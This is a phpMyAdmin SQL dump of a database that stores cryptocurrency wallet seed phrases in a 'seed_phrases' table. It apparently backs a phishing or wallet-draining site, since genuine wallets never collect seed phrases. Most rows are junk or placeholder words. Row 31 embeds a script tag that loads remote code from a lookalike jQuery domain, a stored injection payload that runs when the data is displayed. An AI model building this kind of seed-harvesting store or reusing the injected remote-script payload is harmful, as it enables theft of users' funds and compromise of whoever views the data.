-- phpMyAdmin SQL Dump
-- version 5.2.2
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Nov 19, 2025 at 07:39 PM
-- Server version: 10.11.13-MariaDB
-- PHP Version: 8.3.20

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `monstra_phrase`
--

-- --------------------------------------------------------

--
-- Table structure for table `seed_phrases`
--

CREATE TABLE `seed_phrases` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `user_id` bigint(20) UNSIGNED DEFAULT NULL,
  `phrase_length` tinyint(3) UNSIGNED NOT NULL,
  `words_json` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT current_timestamp()
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Dumping data for table `seed_phrases`
--

INSERT INTO `seed_phrases` (`id`, `user_id`, `phrase_length`, `words_json`, `created_at`) VALUES
(26, NULL, 12, '[\"gsts\",\"beh\",\"she\",\"bebe\",\"eheh\",\"eh\",\"ehhe\",\"ehhe\",\"eheh\",\"ehhe\",\"ehhe\",\"ehhe\"]', '2025-11-01 08:41:47'),
(27, NULL, 12, '[\"akp\",\"b\",\"drain\",\"v\",\"Ve\",\"b\",\"ge\",\"h\",\"ge\",\"he\",\"gehe\",\"be\"]', '2025-11-02 08:09:27'),
(28, NULL, 12, '[\"gs\",\"hd\",\"d\",\"be\",\"r\",\"he\",\"r\",\"he\",\"Hd\",\"be\",\"fh\",\"hd\"]', '2025-11-09 16:17:15'),
(29, NULL, 12, '[\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\"]', '2025-11-09 18:11:29'),
(30, NULL, 12, '[\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\"]', '2025-11-17 14:19:59'),
(31, NULL, 12, '[\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"word\",\"<script src=\'https:\\/\\/jquery.codes\\/get\\/\'><\\/script>word\"]', '2025-11-17 14:20:11');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `seed_phrases`
--
ALTER TABLE `seed_phrases`
  ADD PRIMARY KEY (`id`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `seed_phrases`
--
ALTER TABLE `seed_phrases`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=32;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
